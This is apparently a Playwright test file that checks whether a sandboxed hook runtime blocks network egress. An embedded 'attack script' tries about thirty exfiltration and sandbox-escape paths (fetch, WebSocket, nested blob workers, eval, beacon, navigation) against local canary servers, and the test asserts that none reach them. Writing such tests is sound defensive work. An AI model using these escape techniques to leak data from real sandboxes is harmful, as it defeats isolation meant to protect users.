/**
 * Egress attempts from hook code. Every path a worker has (and a few it shouldn't) is tried
 * against a same-origin canary path and a cross-origin canary server; the server logs any
 * request. Run twice: with the bootstrap lockdown (production) and without it, to show the
 * iframe sandbox + CSP alone stop every attempt.
 */

import { expect, test } from '@playwright/test';
import { egressLog, openRuntime, resetEgress } from './util.ts';

const X = 'http://127.0.0.1:4418/'; // cross-origin canary
const S = 'http://127.0.0.1:4417/canary/'; // same origin as the runtime page

/** The attack script. Top-level attempts run when the sandbox starts; the rest in a hook. */
const EGRESS = `
var X = ${JSON.stringify(X)}, S = ${JSON.stringify(S)}, out = {};
function attempt(name, f) {
	return new Promise(function (resolve) {
		var done = function (v) { if (name in out) return; out[name] = String(v).slice(0, 60); resolve(); };
		try {
			var r = f();
			if (r && typeof r.then === 'function') r.then(function (v) { done('ok:' + v); }, function (e) { done('blocked:' + (e && e.name || e)); });
			else done('ran:' + r);
		} catch (e) { done('blocked:' + (e && e.name || e)); }
		setTimeout(function () { done('pending'); }, 700);
	});
}
function blobUrl(code) { return URL.createObjectURL(new Blob([code], { type: 'text/javascript' })); }
// Top level, before any invocation.
try { fetch(X + 'toplevel-fetch'); } catch (e) {}
try { importScripts(X + 'toplevel-import.js'); } catch (e) {}
osp.on('onPageShown', function (ctx, data, act) {
	var tries = [
		attempt('fetch', function () { return fetch(X + 'fetch').then(function (r) { return r.status; }); }),
		attempt('fetchSameOrigin', function () { return fetch(S + 'fetch').then(function (r) { return r.status; }); }),
		attempt('fetchNoCors', function () { return fetch(X + 'no-cors', { mode: 'no-cors' }).then(function () { return 'sent'; }); }),
		attempt('fetchViaPrototype', function () {
			for (var o = self; o; o = Object.getPrototypeOf(o)) { var d = Object.getOwnPropertyDescriptor(o, 'fetch'); if (d && typeof d.value === 'function') return d.value.call(self, X + 'proto'); }
			throw new Error('no fetch anywhere');
		}),
		attempt('xhr', function () { return new Promise(function (res, rej) { var x = new XMLHttpRequest(); x.open('GET', X + 'xhr'); x.onload = function () { res(x.status); }; x.onerror = function () { rej(new Error('xhr-error')); }; x.send(); }); }),
		attempt('xhrSync', function () { var x = new XMLHttpRequest(); x.open('GET', S + 'xhr-sync', false); x.send(); return x.status; }),
		attempt('websocket', function () { return new Promise(function (res, rej) { var w = new WebSocket('ws://127.0.0.1:4418/ws'); w.onopen = function () { res('open'); }; w.onerror = function () { rej(new Error('ws-error')); }; }); }),
		attempt('eventSource', function () { return new Promise(function (res, rej) { var es = new EventSource(X + 'sse'); es.onopen = function () { res('open'); }; es.onerror = function () { es.close(); rej(new Error('es-error')); }; }); }),
		attempt('importScripts', function () { importScripts(X + 'import.js'); return 'imported'; }),
		attempt('importScriptsBlob', function () { importScripts(blobUrl('fetch(' + JSON.stringify(X + 'blob-import') + ')')); return 'imported'; }),
		attempt('nestedWorkerBlob', function () {
			var w = new Worker(blobUrl('fetch(' + JSON.stringify(X + 'nested-fetch') + '); try { importScripts(' + JSON.stringify(X + 'nested-import.js') + '); } catch (e) {}'));
			return new Promise(function (r) { setTimeout(function () { r('created'); }, 300); });
		}),
		attempt('nestedWorkerData', function () { new Worker('data:text/javascript,fetch(' + JSON.stringify(X + 'nested-data') + ')'); return 'created'; }),
		attempt('nestedWorkerUrl', function () { new Worker(X + 'worker.js'); return 'created'; }),
		attempt('sharedWorker', function () { new SharedWorker(blobUrl('fetch(' + JSON.stringify(X + 'shared') + ')')); return 'created'; }),
		attempt('beacon', function () { return navigator.sendBeacon(X + 'beacon', 'x'); }),
		attempt('image', function () { var i = new Image(); i.src = X + 'img'; return 'set'; }),
		attempt('fontFace', function () { return new FontFace('x', 'url(' + X + 'font.woff)').load(); }),
		attempt('webTransport', function () { return new WebTransport('https://127.0.0.1:4418/wt').ready; }),
		attempt('eval', function () { return eval('fetch(X + "eval")'); }),
		attempt('Function', function () { return new Function('return fetch("' + X + 'function")')(); }),
		attempt('setTimeoutString', function () { setTimeout('fetch("' + X + 'timeout-string")', 0); return 'scheduled'; }),
		attempt('wasm', function () { return WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])); }),
		attempt('navigateWorker', function () { location.href = X + 'navigate'; return location.href; }),
		attempt('open', function () { return open(X + 'popup'); }),
		attempt('postToFrame', function () { self.postMessage({ navigate: X + 'via-frame', html: '<img src=' + X + 'via-frame-img>' }); return 'posted'; }),
		attempt('cacheStorage', function () { return caches.open('x').then(function (c) { return c.add(X + 'cache'); }); }),
		attempt('indexedDB', function () { return typeof indexedDB.open('x'); }),
		attempt('broadcastChannel', function () { new BroadcastChannel('osp').postMessage('x'); return 'posted'; }),
		attempt('serviceWorker', function () { return navigator.serviceWorker.register(blobUrl('')); }),
		attempt('notification', function () { return new Notification('x'); })
	];
	return Promise.all(tries).then(function () {
		var keys = Object.keys(out);
		for (var i = 0; i < keys.length && i < 32; i++) act.addParadata('egress.' + keys[i], out[keys[i]]);
	});
});
`;

for (const lockdown of [true, false]) {
	test(`no egress from hook code (${lockdown ? 'with' : 'without'} the bootstrap lockdown)`, async ({ page, request }) => {
		await resetEgress(request);
		const popups: string[] = [];
		page.on('popup', (p) => popups.push(p.url()));
		const frame = await openRuntime(page);
		const r = await frame.evaluate(
			async ({ src, lockdown }) => {
				const { runner, host } = window.H.make(src, {
					host: { lockdown },
					manifest: { handlers: { onPageShown: { reads: [], writes: [], timeoutMs: 4000 } } }
				});
				const outcome = await runner.begin();
				await window.H.sleep(1500); // give stray async attempts (nested workers, timers) time to land
				return {
					outcome,
					attempts: Object.fromEntries((runner.state.data.hooks?.paradata ?? []).map((p) => [p.key, p.value])),
					frames: document.querySelectorAll('iframe').length,
					href: location.href,
					stats: host.stats
				};
			},
			{ src: EGRESS, lockdown }
		);
		await page.waitForTimeout(500);
		const hits = await egressLog(request);
		// The gate: nothing reached either server, by any path.
		expect(hits, JSON.stringify(r.attempts, null, 1)).toEqual([]);
		expect(popups).toEqual([]);
		expect(r.href).toMatch(/\/runtime\.html$/);
		expect(page.url()).toMatch(/\/index\.html$/);
		expect(r.frames).toBe(1);
		expect(r.outcome).toMatchObject({ outcome: 'ok' });
		// The hook ran and reported every attempt (blocked, or harmless where it "ran").
		expect(Object.keys(r.attempts).length).toBeGreaterThanOrEqual(28);
		for (const k of ['fetch', 'fetchSameOrigin', 'xhr', 'websocket', 'importScripts', 'eval', 'Function', 'wasm']) {
			expect(String(r.attempts[`egress.${k}`]), k).toMatch(/^blocked|^pending/);
		}
		test.info().annotations.push({ type: 'attempts', description: JSON.stringify(r.attempts) });
		if (process.env.HOOKS_E2E_VERBOSE) console.log(test.info().project.name, lockdown, JSON.stringify(r.attempts, null, 1));
	});
}

test('positive control: the canary does see requests that are not sandboxed', async ({ page, request }) => {
	await resetEgress(request);
	const frame = await openRuntime(page);
	await frame.evaluate(async (S) => {
		await fetch(`${S}control`).catch(() => undefined);
	}, S);
	await page.evaluate(async (X) => {
		await fetch(`${X}control`).catch(() => undefined);
	}, X);
	const hits = await egressLog(request);
	expect(hits.map((h) => `${h.server}${h.url}`).sort()).toEqual(['app/canary/control', 'canary/control']);
	await resetEgress(request);
});
